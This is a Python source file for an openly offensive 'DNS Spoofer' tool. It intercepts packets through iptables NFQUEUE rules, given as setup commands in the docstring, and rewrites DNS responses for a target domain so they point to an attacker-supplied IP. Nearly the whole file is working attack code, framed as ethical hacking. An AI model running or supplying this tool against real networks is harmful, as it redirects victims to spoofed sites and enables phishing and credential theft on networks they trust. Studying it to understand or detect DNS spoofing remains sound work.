#!/usr/bin/env python
# coding=utf-8
"""
Title:    DNS Spoofer
Author:   Aniket Ambore
Date:     June 28, 2021
Comment:  DNS Spoofer - Intercepting and Modifying Packets.

scapy Docs => https://scapy.readthedocs.io/en/latest/introduction.html
Through scapy module we can create different network tools like ARP Spoofer, Network Scanner, packet dumpers etc. This module can be used to create more advanced tools related to network security and ethical hacking.
netfilterqueue Docs => https://pypi.org/project/NetfilterQueue/
argparse Docs => https://docs.python.org/3/library/argparse.html#module-argparse

Before Running :-
sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
sudo iptables -I INPUT -j NFQUEUE --queue-num 0
"""
import netfilterqueue
import scapy.all as scapy
import argparse
import sys
import time

FAIL = '\033[91m'
OKGREEN = '\033[92m'
OKCYAN = '\033[96m'
ORANGE = '\033[93m'
PURPLE = '\033[95m'

real_website = ""
fake_website_ip = ""
queue_num = ""


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-rw", "--realweb", dest="real_web", help="Target URL of the real website to spoof")
    parser.add_argument("-fw", "--fakeweb", dest="fake_web", help="IP of the fake website to spoof")
    parser.add_argument("-qm", "--queuenum", dest="queue_num", help="Queue Num that, you set with the help of iptables")
    options = parser.parse_args()
    if not options.real_web:
        parser.error(FAIL + "[-] Please specify url of the real website to spoof, use --help for more info.")
    elif not options.fake_web:
        parser.error(FAIL + "[-] Please specify ip address of the fake website to spoof, use --help for more info.")
    elif not options.queue_num:
        parser.error(
            FAIL + "[-] Please specify Queue Num that, you set with the help of iptables, use --help for more info.")
    return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    # DNSRR --> DNS Response
    # DNSRQ --> DNS Request
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if real_website in qname:
            print(
                    OKCYAN + "[+] " + OKGREEN + "Spoofing Target >> " + ORANGE + real_website + OKGREEN + " with " + ORANGE + fake_website_ip)
            # DNSRR --> DNS Resource Record
            answer = scapy.DNSRR(rrname=qname, rdata=fake_website_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # len --> size of the layer.
            # chksum --> used to make sure that the packet is not modified.
            # Remove it from our packet.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    # print(packet.get_payload())
    packet.accept()
    # packet.drop()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0. / 100)


def script_header():
    slowprint('''\033[1;31m \033[94m
╔╦╗╔╗╔╔═╗  ╔═╗┌─┐┌─┐┌─┐┌─┐┌─┐┬─┐
 ║║║║║╚═╗  ╚═╗├─┘│ ││ │├┤ ├┤ ├┬┘
═╩╝╝╚╝╚═╝  ╚═╝┴  └─┘└─┘└  └─┘┴└─
    ''')


options = get_arguments()
script_header()
real_website = options.real_web
fake_website_ip = options.fake_web
queue_num = options.queue_num

nfqueue = netfilterqueue.NetfilterQueue()
# nfqueue.bind(queuenum , callbackfunction)
nfqueue.bind(int(queue_num), process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print(FAIL + "\n[!] Caught KeyboardInterrupt Exception...")
